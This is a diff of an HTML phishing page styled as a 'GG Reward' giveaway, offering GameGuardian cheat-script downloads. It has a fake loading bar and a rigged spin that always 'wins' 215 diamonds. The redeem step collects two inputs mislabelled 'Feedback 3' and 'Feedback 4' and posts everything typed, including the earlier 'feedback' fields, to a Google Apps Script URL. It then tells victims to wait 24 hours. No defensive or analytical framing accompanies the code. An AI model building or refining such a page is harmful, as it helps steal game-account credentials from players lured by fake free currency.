@@ -1,197 +1,204 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Feedback Hub</title>
+<title>GG Reward</title>
 
 <style>
-*{box-sizing:border-box}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 body{
-  margin:0;
+  margin:0;height:100vh;
+  display:flex;justify-content:center;align-items:center;
   font-family:Helvetica,Arial,sans-serif;
-  background:radial-gradient(circle at top,#6a35c9,#0b0016);
+  background:radial-gradient(circle at top,#5e2b97,#0b0016);
   color:#fff;
 }
-
-/* LOADING */
-#loading{
-  position:fixed;inset:0;
-  display:flex;flex-direction:column;
-  justify-content:center;align-items:center;
-}
-#bar{
-  width:80%;height:8px;
-  background:rgba(255,255,255,.2);
-  border-radius:10px;overflow:hidden;
-}
-#bar span{
-  display:block;height:100%;
-  width:0%;
-  background:#3fa9ff;
-  transition:.1s;
-}
-
-/* CARD */
+.hidden{display:none}
 .card{
   width:94%;max-width:360px;
-  margin:40px auto;
   background:rgba(255,255,255,.08);
-  backdrop-filter:blur(16px);
+  backdrop-filter:blur(14px);
   border-radius:18px;
-  padding:18px;
-  box-shadow:0 0 40px rgba(100,0,255,.4);
-}
-
-.hidden{display:none}
-
-/* FACEBOOK-LIKE FEEDBACK STYLE */
-.fb-title{
-  font-size:22px;
-  font-weight:700;
-  text-align:center;
-  margin-bottom:4px;
-}
-.fb-sub{
-  text-align:center;
-  font-size:13px;
-  opacity:.8;
-  margin-bottom:14px;
+  padding:18px;text-align:center;
+  box-shadow:0 0 40px rgba(90,0,255,.4);
 }
 input{
-  width:100%;
-  padding:12px;
-  border-radius:10px;
-  border:none;
-  margin-bottom:10px;
-  outline:none;
+  width:100%;height:44px;
+  border-radius:8px;border:1px solid #ccc;
+  padding:0 12px;font-size:15px;
+  margin:8px 0;
 }
 button{
-  width:100%;
-  padding:12px;
-  border:none;
-  border-radius:12px;
-  background:#3fa9ff;
-  color:#fff;
-  font-weight:700;
+  width:100%;height:44px;
+  border:none;border-radius:10px;
+  background:linear-gradient(135deg,#4da6ff,#7a3cff);
+  color:#fff;font-weight:bold;
 }
-
-/* NAV */
 .nav{
-  display:flex;
-  justify-content:space-around;
-  margin-bottom:14px;
-  font-size:13px;
+  display:flex;gap:6px;margin-bottom:10px;
 }
-.nav div{opacity:.6}
-.nav .active{opacity:1;font-weight:700}
-
-/* SPIN */
-#wheel{
-  width:220px;height:220px;
+.nav div{
+  flex:1;padding:8px;
+  background:rgba(255,255,255,.15);
+  border-radius:8px;
+  cursor:pointer;
+}
+.loader{
+  width:70px;height:70px;
   border-radius:50%;
-  border:6px solid #3fa9ff;
+  border:6px solid rgba(255,255,255,.2);
+  border-top:6px solid #2da9ff;
+  animation:spin 1s linear infinite;
   margin:20px auto;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.spinBox{
+  height:60px;
+  background:rgba(255,255,255,.15);
+  border-radius:10px;
   display:flex;align-items:center;justify-content:center;
-  font-size:40px;
+  font-size:20px;margin:20px 0;
+}
+.dots::after{
+  content:"•••••";
+  animation:dots 1s infinite;
+}
+@keyframes dots{
+  0%{opacity:.2}50%{opacity:1}100%{opacity:.2}
 }
 </style>
 </head>
 
 <body>
+<div class="card">
 
 <!-- LOADING -->
 <div id="loading">
-  <h3>Loading <span id="percent">1%</span></h3>
-  <div id="bar"><span></span></div>
+  <div class="loader"></div>
+  <div id="percent">Loading 0%</div>
 </div>
 
-<!-- FEEDBACK -->
-<div id="feedback" class="card hidden">
-  <div class="fb-title">FEEDBACK</div>
-  <div class="fb-sub">Help us improve</div>
-
+<!-- INTRO FEEDBACK -->
+<div id="intro" class="hidden">
+  <h3>FEEDBACK</h3>
   <input id="f1" placeholder="Feedback 1">
   <input id="f2" placeholder="Feedback 2">
-  <button onclick="submitFeedback()">Submit Feedback</button>
+  <button onclick="submitIntro()">SUBMIT</button>
+  <div id="introLoad" class="hidden dots"></div>
 </div>
 
 <!-- MAIN -->
-<div id="main" class="card hidden">
-
+<div id="main" class="hidden">
   <div class="nav">
-    <div onclick="showTab('download')" class="active">SCRIPT DOWNLOAD</div>
-    <div onclick="showTab('spin')">SPIN</div>
-    <div onclick="showTab('redeem')">REDEEM</div>
+    <div onclick="show('script')">GG SCRIPT</div>
+    <div onclick="show('spin')">SPIN</div>
+    <div onclick="show('redeem')">REDEEM</div>
   </div>
 
-  <!-- DOWNLOAD -->
-  <div id="download">
-    <button>DOWNLOAD</button><br><br>
-    <button>DOWNLOAD</button><br><br>
-    <button>DOWNLOAD</button>
+  <div id="script">
+    <p>FOR GAMEGUARDIAN SCRIPT</p>
+    <button>DOWNLOAD 1</button><br><br>
+    <button>DOWNLOAD 2</button><br><br>
+    <button>DOWNLOAD 3</button>
   </div>
 
-  <!-- SPIN -->
   <div id="spin" class="hidden">
-    <p style="text-align:center">CHANCE TO GET EPIC SKIN OR DIAMOND</p>
-    <div id="wheel">🎁</div>
-    <button onclick="spin()">SPIN</button>
+    <div class="spinBox" id="spinText">READY</div>
+    <button onclick="startSpin()">SPIN</button>
   </div>
 
-  <!-- REDEEM -->
   <div id="redeem" class="hidden">
-    <h3>💎225</h3>
-    <input placeholder="Enter text">
-    <input placeholder="Enter text">
-    <button onclick="alert('Successfully Redeemed')">Redeem</button>
+    <h3>215💎</h3>
+    <input id="f3" placeholder="Feedback 3">
+    <input id="f4" placeholder="Feedback 4">
+    <button onclick="submitRedeem()">REDEEM</button>
+    <div id="redeemLoad" class="hidden dots"></div>
   </div>
+</div>
+
+<!-- DONE -->
+<div id="done" class="hidden">
+  <h3>Successfully Redeem</h3>
+  <p>Wait 24hrs</p>
+  <button onclick="backMain()">Back to Main</button>
+</div>
 
 </div>
 
 <script>
-/* LOADING */
+const URL="https://script.google.com/macros/s/AKfycbzZIS-wdV0lcOgd6yt-A1NYp51szzmvbjgXwrpm4uM9enAkBC1M7EmQAnIH1jE8nktMgA/exec";
+let spun=false;
+
 let p=0;
 let load=setInterval(()=>{
   p++;
-  percent.innerText=p+"%";
-  document.querySelector("#bar span").style.width=p+"%";
+  percent.innerText="Loading "+p+"%";
   if(p>=100){
     clearInterval(load);
     loading.classList.add("hidden");
-    feedback.classList.remove("hidden");
+    intro.classList.remove("hidden");
   }
-},100);
+},120);
 
-/* FEEDBACK */
-function submitFeedback(){
-  const data={
-    time:new Date().toLocaleString(),
-    f1:f1.value,
-    f2:f2.value,
-    device:navigator.userAgent,
-    location:"N/A"
-  };
-
-  fetch("https://script.google.com/macros/s/AKfycbxE-8YQziDsrweH5FHWCWx-lYwh7bX-Mz7v_1BOxbWz5hoNRy-idSJybjdRMLPvJZ1Vcw/exec",{
+function submitIntro(){
+  introLoad.classList.remove("hidden");
+  fetch(URL,{
     method:"POST",
-    body:JSON.stringify(data)
+    body:JSON.stringify({
+      type:"intro",
+      f1:f1.value,
+      f2:f2.value
+    })
   });
+  setTimeout(()=>{
+    intro.classList.add("hidden");
+    main.classList.remove("hidden");
+    introLoad.classList.add("hidden");
+  },5000);
+}
 
-  feedback.classList.add("hidden");
+function show(id){
+  script.classList.add("hidden");
+  spin.classList.add("hidden");
+  redeem.classList.add("hidden");
+  document.getElementById(id).classList.remove("hidden");
+}
+
+function startSpin(){
+  if(spun) return;
+  spun=true;
+  let items=["Text","Text","Text","Text","Text","Text","215💎"];
+  let i=0;
+  let anim=setInterval(()=>{
+    spinText.innerText=items[i%items.length];
+    i++;
+  },300);
+  setTimeout(()=>{
+    clearInterval(anim);
+    spinText.innerText="215💎";
+  },7000);
+}
+
+function submitRedeem(){
+  redeemLoad.classList.remove("hidden");
+  fetch(URL,{
+    method:"POST",
+    body:JSON.stringify({
+      type:"redeem",
+      f3:f3.value,
+      f4:f4.value
+    })
+  });
+  setTimeout(()=>{
+    main.classList.add("hidden");
+    done.classList.remove("hidden");
+  },5000);
+}
+
+function backMain(){
+  done.classList.add("hidden");
   main.classList.remove("hidden");
-}
-
-/* NAV */
-function showTab(tab){
-  document.querySelectorAll("#download,#spin,#redeem").forEach(d=>d.classList.add("hidden"));
-  document.getElementById(tab).classList.remove("hidden");
-}
-
-/* SPIN */
-function spin(){
-  alert("You got 💎225");
-  showTab("redeem");
+  show("script");
 }
 </script>
 
